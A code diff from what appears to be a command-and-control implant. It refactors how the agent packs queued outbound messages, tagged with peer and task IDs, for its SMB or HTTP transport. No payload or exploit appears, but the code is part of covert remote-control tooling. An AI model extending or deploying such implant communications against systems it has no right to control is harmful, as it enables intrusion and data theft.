@@ -136,6 +136,49 @@ namespace Dispatcher {
         }
     }
 
+    BOOL PackageStream(_stream *out) {
+        HEXANE
+
+        // todo: refactor this to work with the new queue list process
+        _stream *head   = Ctx->transport.outbound_queue;
+        _parser parser  = { };
+
+        while (head) {
+            if (!head->ready) {
+                if (head->length + MESSAGE_HEADER_SIZE + out->length > MESSAGE_MAX) {
+                    break;
+                }
+
+                if (head->buffer) {
+                    Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
+
+                    Stream::PackDword(out, head->peer_id);
+                    Stream::PackDword(out, head->task_id);
+                    Stream::PackDword(out, head->msg_type);
+
+                    if (Ctx->root) {
+                        Stream::PackBytes(out, B_PTR(head->buffer), head->length);
+
+                    } else {
+                        out->buffer = x_realloc(out->buffer, out->length + head->length);
+                        x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
+
+                        out->length += head->length;
+                    }
+                } else {
+                    ntstatus = ERROR_NO_DATA;
+                    return false;
+                }
+
+                head->ready = true;
+            }
+
+            head = head->next;
+        }
+
+        return true;
+    }
+
     VOID MessageTransmit() {
         HEXANE
 
@@ -143,13 +186,12 @@ namespace Dispatcher {
         _stream *in     = { };
         _stream *head   = { };
         _stream *swap   = { };
-        _parser parser  = { };
 
         retry:
-        // todo: this will fail infinitely on smb as no new messages will be read in
         if (!Ctx->transport.outbound_queue) {
 
 #if     defined(TRANSPORT_SMB)
+            // todo: this will fail infinitely on smb as no new messages will be read in
             return_defer(ERROR_SUCCESS);
 #elif   defined(TRANSPORT_HTTP)
             PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);
@@ -158,38 +200,8 @@ namespace Dispatcher {
             goto retry;
 #endif
         } else {
-            head = Ctx->transport.outbound_queue;
-            while (head) {
-
-                if (!head->ready) {
-                    if (head->length + MESSAGE_HEADER_SIZE + out->length > MESSAGE_MAX) {
-                        break;
-                    }
-
-                    if (head->buffer) {
-                        Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-
-                        Stream::PackDword(out, head->peer_id);
-                        Stream::PackDword(out, head->task_id);
-                        Stream::PackDword(out, head->msg_type);
-
-                        if (Ctx->root) {
-                            Stream::PackBytes(out, B_PTR(head->buffer), head->length);
-
-                        } else {
-                            out->buffer = x_realloc(out->buffer, out->length + head->length);
-                            x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
-
-                            out->length += head->length;
-                        }
-                    } else {
-                        return_defer(ERROR_NO_DATA);
-                    }
-
-                    head->ready = true;
-                }
-
-                head = head->next;
+            if (!PackageStream(out)) {
+                return_defer(ntstatus);
             }
         }
 
